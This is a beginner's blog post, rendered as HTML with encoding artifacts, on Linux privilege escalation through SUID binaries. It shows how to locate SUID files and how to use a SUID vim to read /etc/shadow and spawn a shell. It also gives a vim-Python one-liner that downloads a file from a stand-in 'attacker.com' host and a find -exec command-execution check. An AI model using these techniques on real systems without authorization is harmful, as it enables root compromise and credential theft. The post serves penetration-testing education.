I"ù<hr />

<p><strong><span style="color:#06bf04">Hi Guys, This is my First blog about Linux Privilege escalation. So Without wasting any time Let‚Äôs Start I‚Äôll start with basics. </span></strong></p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/1.png" alt="Desktop View" /></p>

<p>‚Äì</p>

<h1 id="so-what-is-linux-and-privilege-escalation">So, What is Linux and Privilege Escalation</h1>

<ol>
  <li>
    <p>Linux -: Linux is the best-known and most-used open-source operating system. As an operating system, Linux is software that sits underneath all of the other software on a computer, receiving requests from those programs and relaying these requests to the computer‚Äôs hardware.</p>
  </li>
  <li>
    <p>PRIVILEGE ESCALATION -: Privilege escalation is a common way for attackers to gain unauthorized access to systems within a security perimeter.</p>
  </li>
  <li>
    <p>Attackers start by finding weak points in an organization‚Äôs defenses and gaining access to a system. In many cases that the first point of penetration will not grant attackers with the level of access or data they need. They will then attempt privilege escalation to gain more permissions or obtain access to additional, more sensitive systems.</p>
  </li>
</ol>

<h1 id="why-privilege-escalation-is-important-">Why Privilege Escalation is Important ?</h1>

<p>While usually not the main aim of an attacker, privilege escalation is frequently used in preparation for a more specific attack, allowing intruders to deploy a malicious payload or execute malicious code in the targeted system. This means that whenever you detect or suspect privilege escalation, you also need to look for signs of other malicious activity. However, even without evidence of further attacks, any privilege escalation incident is an information security issue in itself, because someone could have gained unauthorized access to personal, confidential, or otherwise sensitive data. In many cases, this will have to be reported internally or to the relevant authorities to ensure compliance.</p>

<p>So here we covered some theoretical part the meaning of privilege escalation is gaining access on the root with a non-root account.</p>

<h1 id="privilege-escalation-through-suid">Privilege Escalation through SUID</h1>

<p><strong>SUID</strong> setuid and setgid are Unix access rights flags that allow users to run an executable.</p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/2.png" alt="Desktop View" /></p>

<h3 id="list-of-executables--">List of executables -:</h3>

<ol>
  <li>vim</li>
  <li>find</li>
  <li>Nmap</li>
  <li>bash</li>
  <li>less</li>
  <li>more</li>
</ol>

<h1 id="how-to-find-files-with-suid-set-in-linux">How to Find Files with SUID Set in Linux?</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>find <span class="nb">.</span> <span class="nt">-perm</span> /4000
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/3.png" alt="Desktop View" /></p>

<p>you can add more things in this like -l(long listing).</p>

<h1 id="1vim--">1.VIM -:</h1>
<p>Vim is a highly configurable text editor built to enable efficient text editing. It is an improved version of the vi editor distributed with most UNIX/Linux systems. If vim is running as a suid it can access some root files.
You can access any file you can do many things like spawning shell.</p>

<p>like this -:</p>

<h3 id="1-vimtiny-etcshadow">1. vim.tiny /etc/shadow</h3>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/4.png" alt="Desktop View" /></p>

<ol>
  <li>Press ESC key</li>
</ol>

<p>:set shell=/bin/sh</p>

<p>:shell</p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/5.png" alt="Desktop View" /></p>

<ol>
  <li>file download -:</li>
</ol>

<p>export URL=http://attacker.com/file_to_get</p>

<p>export LFILE=file_to_save</p>

<p>vim -c ‚Äò:py import vim,sys; from os import environ as e</p>

<p>if sys.version_info.major == 3: import urllib.request as r</p>

<p>else: import urllib as r</p>

<p>r.urlretrieve(e[‚ÄúURL‚Äù], e[‚ÄúLFILE‚Äù])</p>

<p>vim.command(‚Äú:q!‚Äù)‚Äô</p>

<p>for more checkout <a href="https://gtfobins.github.io/gtfobins/vim/">here</a></p>

<h1 id="2-find">2. find</h1>

<h3 id="find---find-is-used-to-find-files">find -: find is used to find files</h3>

<p>touch *****</p>

<p>find ***** -exec whoami \;</p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/6.png" alt="Desktop View" /></p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/7.png" alt="Desktop View" /></p>
:ET